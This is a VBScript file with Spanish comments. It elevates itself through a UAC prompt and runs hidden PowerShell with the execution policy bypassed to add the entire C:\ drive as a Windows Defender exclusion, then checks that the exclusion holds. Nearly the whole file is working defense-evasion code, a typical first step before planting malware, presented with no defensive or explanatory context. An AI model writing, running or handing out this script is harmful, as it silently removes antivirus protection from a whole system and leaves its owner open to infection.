' Script VBScript mejorado para excluir unidad C:\ de Windows Defender
' Requiere privilegios de administrador

Option Explicit

Dim UAC, ws, fso, shell
Dim psCommand, result, checkCommand
Dim scriptPath, scriptName

' Crear objetos necesarios
Set UAC = CreateObject("Shell.Application")
Set ws = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

scriptPath = WScript.ScriptFullName
scriptName = fso.GetFileName(scriptPath)

' Verificar si ya se ejecutó con privilegios de administrador
If WScript.Arguments.Length = 0 Then
    ' Solicitar elevación UAC
    On Error Resume Next
    UAC.ShellExecute "wscript.exe", Chr(34) & scriptPath & Chr(34) & " RunAsAdministrator", "", "runas", 1
    If Err.Number <> 0 Then
        MsgBox "Error al solicitar privilegios de administrador: " & Err.Description, vbCritical, "Error"
        WScript.Quit 1
    End If
    On Error GoTo 0
    WScript.Quit 0
End If

' Esperar un momento para que se complete la elevación
WScript.Sleep 2000

' Verificar si Windows Defender está disponible
On Error Resume Next
checkCommand = "powershell -WindowStyle Hidden -Command ""Get-MpPreference -ErrorAction SilentlyContinue | Out-Null; if ($?) { exit 0 } else { exit 1 }"""
result = ws.Run(checkCommand, 0, True)
On Error GoTo 0

If result <> 0 Then
    MsgBox "Windows Defender no está disponible o no está instalado.", vbExclamation, "Advertencia"
    WScript.Quit 1
End If

' Comando PowerShell mejorado para agregar exclusión
' Usa -ErrorAction Stop para capturar errores correctamente
psCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command """ & _
    "$ErrorActionPreference = 'Stop'; " & _
    "try { " & _
        "Add-MpPreference -ExclusionPath 'C:\' -ErrorAction Stop; " & _
        "Write-Host 'Exclusión agregada exitosamente'; " & _
        "exit 0 " & _
    "} catch { " & _
        "Write-Host 'Error: ' + $_.Exception.Message; " & _
        "exit 1 " & _
    "}""" & ""

' Ejecutar el comando y capturar el resultado
On Error Resume Next
result = ws.Run(psCommand, 0, True)
On Error GoTo 0

' Verificar si la exclusión se agregó correctamente
If result = 0 Then
    ' Verificar que la exclusión se agregó
    checkCommand = "powershell -WindowStyle Hidden -Command """ & _
        "$exclusions = Get-MpPreference -ExclusionPath; " & _
        "if ($exclusions -contains 'C:\') { exit 0 } else { exit 1 }""" & ""
    
    result = ws.Run(checkCommand, 0, True)
    
    If result = 0 Then
        MsgBox "La unidad C:\ ha sido excluida exitosamente de Windows Defender.", vbInformation, "Éxito"
    Else
        MsgBox "El comando se ejecutó pero no se pudo verificar la exclusión.", vbExclamation, "Advertencia"
    End If
Else
    MsgBox "Error al agregar la exclusión. Asegúrese de tener privilegios de administrador.", vbCritical, "Error"
    WScript.Quit 1
End If

WScript.Quit 0
